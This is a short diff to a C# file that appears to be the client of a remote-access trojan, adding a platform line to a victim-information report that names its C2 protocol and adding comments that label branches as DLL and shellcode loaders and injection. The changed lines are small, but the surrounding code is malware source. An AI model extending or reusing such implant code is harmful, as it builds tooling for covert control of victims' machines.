@@ -738,6 +738,7 @@ namespace winClient48
                                 $"StartUp: {info.szStartupPath}\n" +
                                 $"OS: {info.szOS}\n" +
                                 $"C2 Protocol: {Enum.GetName(typeof(clsVictim.enProtocol), m_protocol)}\n" +
+                                $"Platform: {(Environment.Is64BitProcess ? "x64" : "x86")}\n" +
                                 $"\n" +
                                 $"[User]\n" +
                                 $"Monitor[{info.ls_Monitor.Count}]: [{string.Join(", ", info.ls_Monitor)}]\n" +
@@ -2516,7 +2517,11 @@ namespace winClient48
 
                         switch (nMethod)
                         {
-                            case -1:
+                            /* Method < 0: DLL Loader
+                             * Method >= 0: DLL Injection.
+                             */
+
+                            case -1: //DLL Loader
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = Process.GetCurrentProcess().MainModule.FileName,
@@ -2570,6 +2575,10 @@ namespace winClient48
 
                         switch (nMethod)
                         {
+                            /* Method < 0: Shellcode Loader
+                             * Method >= 0: Shellcode injection.
+                             */
+
                             case -1:
                                 var psi = new ProcessStartInfo
                                 {
